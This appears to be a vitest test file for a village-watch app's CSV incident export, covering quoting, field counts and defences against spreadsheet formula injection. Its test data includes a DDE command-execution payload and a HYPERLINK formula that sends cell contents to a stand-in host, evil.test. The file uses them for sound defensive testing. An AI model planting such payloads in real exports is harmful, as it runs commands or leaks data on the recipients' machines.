import { describe, expect, it } from "vitest";
import {
  CSV_COLUMNS,
  buildIncidentCsv,
  csvField,
  csvFilename,
  isFormulaBait,
  type ExportIncident,
} from "@/lib/incident-csv";

/**
 * The coordinator CSV export.
 *
 * B4 reported the download as broken, and what made that hard to answer was
 * that nothing asserted what a correct export looks like — the formatting lived
 * inside a route handler that needed a session and a database to reach. It is
 * now `src/lib/incident-csv.ts`, and this is what holds it to its two jobs:
 *
 *   * every record is one row of exactly `CSV_COLUMNS.length` fields, whatever
 *     a reporter typed into a description — commas, quotes and line breaks
 *     included;
 *   * **no cell can execute.** Excel, LibreOffice and Sheets evaluate a cell
 *     beginning `=`, `+`, `-` or `@`, and this file is written to be opened in
 *     Excel by a parish councillor.
 */

const AT = new Date("2026-07-14T09:30:00.000Z");

function incident(overrides: Partial<ExportIncident> = {}): ExportIncident {
  return {
    reference: "VW-2026-0042",
    type: "BURGLARY",
    severity: "HIGH",
    status: "PUBLISHED",
    description: "A shed was forced open overnight.",
    locationText: "Mill Lane",
    peopleCount: 2,
    occurredAt: AT,
    tags: [{ label: "shed" }, { label: "overnight" }],
    ...overrides,
  };
}

/** Splits one CSV record into fields, honouring quotes and doubled quotes. */
function parseLine(line: string): string[] {
  const fields: string[] = [];
  let field = "";
  let quoted = false;

  for (let i = 0; i < line.length; i += 1) {
    const char = line[i];

    if (quoted) {
      if (char === '"') {
        if (line[i + 1] === '"') {
          field += '"';
          i += 1;
        } else {
          quoted = false;
        }
      } else {
        field += char;
      }
    } else if (char === '"') {
      quoted = true;
    } else if (char === ",") {
      fields.push(field);
      field = "";
    } else {
      field += char;
    }
  }

  fields.push(field);
  return fields;
}

/** The file without its BOM, split into records rather than lines. */
function records(csv: string): string[] {
  return csv
    .replace(/^﻿/, "")
    .trimEnd()
    .split(/\r\n(?=(?:[^"]*"[^"]*")*[^"]*$)/);
}

describe("the file", () => {
  it("names every column in the header, unquoted and in order", () => {
    expect(records(buildIncidentCsv([]))[0]).toBe(CSV_COLUMNS.join(","));
  });

  it("is still valid for a village with no incidents", () => {
    const csv = buildIncidentCsv([]);

    // The BOM is what makes Excel read the file as UTF-8 rather than mojibaking
    // every pound sign in it.
    expect(csv.startsWith("﻿")).toBe(true);
    expect(csv.replace(/^﻿/, "")).toBe(`${CSV_COLUMNS.join(",")}\r\n`);
  });

  it("carries the date and a .csv extension in the filename", () => {
    expect(csvFilename(new Date("2026-07-27T23:15:00.000Z"))).toBe(
      "villagewatch-incidents-2026-07-27.csv",
    );
  });
});

describe("a row", () => {
  it("renders every column, with the times in Europe/London", () => {
    const [, row] = records(buildIncidentCsv([incident()]));

    expect(parseLine(row!)).toEqual([
      "14/07/2026",
      // 09:30 UTC in July is 10:30 BST. The formatter is pinned to the village's
      // timezone, not the server's.
      "10:30",
      "VW-2026-0042",
      "Burglary",
      "High",
      "Published",
      "Mill Lane",
      "A shed was forced open overnight.",
      "2",
      // Joined in the order given. Sorting is the query's `orderBy`, not this
      // function's — the builder must not quietly reorder what it was handed.
      "shed; overnight",
    ]);
  });

  it("keeps its field count whatever the reporter typed", () => {
    const csv = buildIncidentCsv([
      incident(),
      incident({ locationText: null, peopleCount: null, tags: [] }),
      incident({ description: 'He said "get off my drive", then left.' }),
      incident({ description: "Two things:\r\nfirst, then second." }),
    ]);

    const rows = records(csv);
    expect(rows).toHaveLength(5);

    for (const row of rows) {
      expect(parseLine(row)).toHaveLength(CSV_COLUMNS.length);
    }
  });

  it("does not let a comma in a description open a new column", () => {
    const [, row] = records(
      buildIncidentCsv([incident({ description: "A car, a van, and a bike." })]),
    );

    expect(parseLine(row!)).toHaveLength(CSV_COLUMNS.length);
    expect(parseLine(row!)[7]).toBe("A car, a van, and a bike.");
  });

  it("wraps a description containing a line break rather than splitting it", () => {
    const csv = buildIncidentCsv([
      incident({ description: "Two things:\r\nfirst, then second." }),
    ]);

    // One record, two physical lines — which is what the quoting is for, and
    // what a naive `split("\n")` reader would get wrong.
    expect(records(csv)).toHaveLength(2);
    expect(csv.replace(/^﻿/, "").trimEnd().split("\r\n")).toHaveLength(3);
  });
});

describe("field escaping", () => {
  it("turns null and undefined into a genuinely empty field", () => {
    // Not the string "null" — a cell reading `null` is worse than a blank one,
    // because it sorts and filters as a value.
    expect(csvField(null)).toBe("");
    expect(csvField(undefined)).toBe("");
  });

  it("doubles quotes rather than dropping them", () => {
    expect(csvField('He said "no".')).toBe('"He said ""no""."');
    expect(parseLine(csvField('He said "no".'))[0]).toBe('He said "no".');
  });
});

describe("formula injection", () => {
  /**
   * Each trigger character on its own, then behind each of the things that used
   * to launder it past a guard anchored straight at the start of the string.
   */
  const payloads = [
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(1:1)",
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("http://evil.test?d="&A1,"Click")',
    // Leading whitespace: Excel discards it and evaluates what is left, so this
    // is a working payload against an anchored test. It is also the first thing
    // anybody tries.
    " =1+1",
    "  \t=1+1",
    " =1+1",
    "﻿=1+1",
    // A control character start, a trigger in its own right.
    "\t=1+1",
    "\r=1+1",
    "\n=1+1",
  ];

  it.each(payloads)("recognises %j as bait", (payload) => {
    expect(isFormulaBait(payload)).toBe(true);
  });

  it.each(payloads)("neutralises %j with a leading apostrophe", (payload) => {
    const parsed = parseLine(csvField(payload))[0]!;

    expect(parsed.startsWith("'")).toBe(true);
    // The prefix is added and nothing is removed, so a coordinator reading the
    // cell still sees exactly what the reporter wrote.
    expect(parsed.slice(1)).toBe(payload);
  });

  it("guards a payload that arrives through the description", () => {
    const [, row] = records(buildIncidentCsv([incident({ description: "=1+1" })]));

    expect(parseLine(row!)[7]).toBe("'=1+1");
  });

  it("guards a payload that arrives through a tag label", () => {
    const [, row] = records(
      buildIncidentCsv([incident({ tags: [{ label: "=1+1" }] })]),
    );

    expect(parseLine(row!)[9]).toBe("'=1+1");
  });

  it.each([
    "A shed was forced open overnight.",
    "Two men, one van",
    // A hyphen and an @ mid-string are not triggers. A guard that fired on these
    // would put a stray apostrophe in front of half the descriptions in the file.
    "3 - 4 people were seen",
    "email@example.test",
    "£40 of tools",
    "",
  ])("leaves ordinary text %j exactly as written", (safe) => {
    expect(isFormulaBait(safe)).toBe(false);
    expect(parseLine(csvField(safe))[0]).toBe(safe);
  });
});
